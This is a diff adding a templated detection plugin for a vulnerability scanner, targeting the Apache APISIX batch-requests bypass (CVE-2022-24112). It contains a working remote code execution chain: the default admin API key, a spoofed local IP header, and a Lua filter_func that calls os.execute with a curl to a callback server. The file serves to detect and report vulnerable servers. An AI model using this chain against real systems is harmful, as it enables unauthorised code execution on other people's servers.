@@ -1,0 +1,127 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheAPISIX_CVE_2022_24112"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "yuradoc (yuradoc.research@gmail.com) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2022-24112"
+  }
+  title: "Apache APISIX RCE (CVE-2022-24112)"
+  description: 
+    "Some Apache APISIX 2.x versions allows attacker to"
+    " bypass IP restrictions of Admin API through the batch-requests plugin."
+    " A default configuration of Apache APISIX (with default API key) is"
+    " vulnerable to remote code execution through the plugin."
+  recommendation:
+    "Update Apache APISIX to a newer version and change the default API key."
+  severity: CRITICAL
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-24112"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "register_route"
+  http_request: {
+    method: POST
+    uri: "/apisix/batch-requests"
+    data: 
+      '{'
+      '  "headers": {'
+      '    "X-Real-IP": "{{ X_REAL_IP }}",'
+      '    "X-API-KEY": "{{ DEFAULT_API_KEY }}",'
+      '    "Content-Type": "application/json"'
+      '  },'
+      '  "timeout": 1500,'
+      '  "pipeline": ['
+      '    {'
+      '      "path": "/apisix/admin/routes/tsunami_rce?ttl=30",'
+      '      "method": "PUT",'
+      '      "body": "{\\"uri\\":\\"/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"nodes\\":{}},\\"name\\":\\"{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"filter_func\\":\\"{{ PIPE_REQ_FILTER_FUNC }}\\"}"'
+      '    }'
+      '  ]'
+      '}'
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: { body {} contains: '"status":200' },
+        conditions: { body {} contains: '"status":201' }
+      }
+    }
+  }
+  cleanup_actions: "cleanup_route"
+}
+
+actions: {
+  name: "execute_route"
+  http_request: {
+    method: GET
+    uri: "/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    headers: [
+      { name: "X-API-KEY" value: "{{ DEFAULT_API_KEY }}" }
+    ]
+  }
+}
+
+actions: {
+  name: "cleanup_route"
+  http_request: {
+    method: DELETE
+    uri: "/apisix/admin/routes/tsunami_rce"
+    response: {
+      http_status: 200
+    }
+    headers: [
+      { name: "X-API-KEY" value: "{{ DEFAULT_API_KEY }}" }
+    ]
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "X_REAL_IP" value: "127.0.0.1" },
+    { name: "DEFAULT_API_KEY" value: "edd1c9f034335f136f87ad84b625c8f1" },
+    { name: "PAYLOAD" value: "curl {{ T_CBS_URI }}" },
+    { name: "PIPE_REQ_FILTER_FUNC" value: "function(vars) os.execute('{{ PAYLOAD }}'); return true end" }
+  ]
+  actions: [
+    "register_route",
+    "sleep",
+    "execute_route",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+config: { debug: True }
